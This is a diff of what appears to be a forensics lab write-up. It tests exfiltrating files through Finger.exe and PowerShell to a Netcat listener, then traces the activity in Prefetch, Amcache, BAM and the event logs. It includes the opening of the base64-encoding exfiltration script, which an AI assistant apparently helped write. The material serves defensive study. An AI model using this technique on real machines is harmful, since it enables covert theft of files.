@@ -64,7 +64,8 @@ Next, I kept the same Netcat listener on Debian and created a second batch scrip
 
 ## Redesign
 
-I used Claude to convert the batch script into a PowerShell script. This script encodes each payload with base64 to send a single argument.
+Using Claude I converted the batch script into a PowerShell script. This script encodes each payload with base64 to send a single argument.
+
 ```shell
 $ip = "10.1.123.123"
 $files = Get-ChildItem "C:\Users\vboxuser\Documents\files\*"
@@ -179,7 +180,6 @@ Prefetch recorded the executions of Finger.exe by the Powershell script.
 Powershell itself was also in Prefetch. However, none of the referenced file's contained the text files being send. 
 The `backup.ps1` script was only found as loaded file for Notepad.exe.
 
-
 ### Amcache
 Amcache recorded one timestamp.
 
@@ -195,10 +195,9 @@ Using RegRipper, I analyzed the SYSTEM hive again and reviewed the BAM module ou
 | --------------------------------------------- | ------------------------------------- |
 | 2026-05-28 10:58:00Z                          | WindowsPowerShell\v1.0\powershell.exe | 
 
-
 ### Event Logs
 #### EvtxECmd
-In the Event Log output of [EvtxECmd](https://github.com/EricZimmerman/evtx) I seached for both `finger.exe` and `powershell`. This returned four logs:
+In the Event Log output of [EvtxECmd](https://github.com/EricZimmerman/evtx) I seached for both `finger.exe` and `powershell`. This returned four logs:
 
 | Time Created        | Event Id | Level     | Provider                            | Channel                                  | Process Id | Computer | User Id                                       | Payload                                                                                                                                                                                              .|
 | ------------------- | -------- | --------- | ----------------------------------- | ---------------------------------------- | ---------- | -------- | --------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
